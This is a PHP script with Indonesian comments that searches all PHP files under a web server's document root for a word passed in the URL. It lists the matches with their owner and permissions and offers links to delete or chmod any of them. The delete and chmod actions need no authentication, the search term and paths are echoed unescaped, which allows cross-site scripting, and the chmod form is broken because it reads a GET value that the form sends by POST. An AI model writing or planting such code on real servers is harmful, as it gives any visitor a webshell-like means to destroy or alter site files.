<?php
function cariKataDalamFile($kata, $direktori) {
    $result = array();

    // Buka direktori
    $dir = opendir($direktori);

    if ($dir) {
        while (false !== ($file = readdir($dir))) {
            if ($file != '.' && $file != '..') {
                $path = $direktori . '/' . $file;

                // Jika ini adalah direktori, rekursif mencari di dalamnya
                if (is_dir($path)) {
                    $result = array_merge($result, cariKataDalamFile($kata, $path));
                } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php') {
                    // Jika ini adalah file PHP, baca isi file
                    $content = file_get_contents($path);
                    if (strpos($content, $kata) !== false) {
                        // Hanya tambahkan ke hasil jika path dimulai dari 'html/'
                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
                        $result[] = array(
                            'path' => $relativePath,
                            'permissions' => substr(sprintf('%o', fileperms($path)), -4)
                        );
                    }
                }
            }
        }
        closedir($dir);
    }

    return $result;
}

function getInfoPemilik($path) {
    $owner = posix_getpwuid(fileowner($path))['name'];
    $group = posix_getgrgid(filegroup($path))['name'];

    return array('owner' => $owner, 'group' => $group);
}

if (isset($_GET['find']) && !empty($_GET['find'])) {
    $kataCari = $_GET['find'];
    $documentRoot = $_SERVER['DOCUMENT_ROOT']; // Ambil direktori root dari server
    $hasilPencarian = cariKataDalamFile($kataCari, $documentRoot);

    if (isset($_GET['delete']) && !empty($_GET['delete'])) {
        $fileToDelete = $_GET['delete'];
        if (file_exists($fileToDelete) && is_file($fileToDelete) && pathinfo($fileToDelete, PATHINFO_EXTENSION) === 'php') {
            if (unlink($fileToDelete)) {
                echo "File '$fileToDelete' berhasil dihapus.";
            } else {
                echo "Gagal menghapus file '$fileToDelete'.";
            }
        } else {
            echo "File yang akan dihapus tidak valid.";
        }
    }

    if (isset($_GET['chmod']) && !empty($_GET['chmod'])) {
        $fileToChmod = $_GET['chmod'];
        if (file_exists($fileToChmod) && is_file($fileToChmod) && pathinfo($fileToChmod, PATHINFO_EXTENSION) === 'php') {
            $newPermissions = octdec($_GET['permissions']);
            if (chmod($fileToChmod, $newPermissions)) {
                echo "Permissions for '$fileToChmod' have been changed to $newPermissions.";
            } else {
                echo "Failed to change permissions for '$fileToChmod'.";
            }
        } else {
            echo "File for chmod is not valid.";
        }
    }

    if (empty($hasilPencarian)) {
        echo "Kata '$kataCari' tidak ditemukan dalam file-file PHP di direktori dan subdirektori.";
    } else {
        echo "<table border='1'>";
        echo "<tr><th>File Path</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Action</th></tr>";
        foreach ($hasilPencarian as $fileInfo) {
            $file = $fileInfo['path'];
            $permissions = $fileInfo['permissions'];

            // Dapatkan informasi pemilik dan grup
            $infoPemilik = getInfoPemilik($_SERVER['DOCUMENT_ROOT'] . $file);
            $owner = $infoPemilik['owner'];
            $group = $infoPemilik['group'];

            $deleteUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&delete=" . urlencode($_SERVER['DOCUMENT_ROOT'] . $file);
            $chmodUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&chmod=" . urlencode($_SERVER['DOCUMENT_ROOT'] . $file);
            $openUrl = "http://{$_SERVER['HTTP_HOST']}" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8');

            echo "<tr>";
            echo "<td><a href='$openUrl' target='_blank'>$file</a></td>";
            echo "<td>$owner</td>";
            echo "<td>$group</td>";
            echo "<td style='color: " . ($owner === 'root' ? 'black' : 'green') . ";'>$permissions</td>";
            echo "<td><a href='$deleteUrl'>Hapus</a> | ";
            echo "<form method='post' action='$chmodUrl'>";
            echo "Ubah Permissions: <input type='text' name='permissions' placeholder='e.g., 0755' required> ";
            echo "<input type='submit' value='Ubah Permissions'>";
            echo "</form></td>";
            echo "</tr>";
        }
        echo "</table>";
    }
} else {
    echo "Harap berikan parameter 'find' dengan kata yang ingin dicari, misalnya: index.php?find=upload";
}
?>
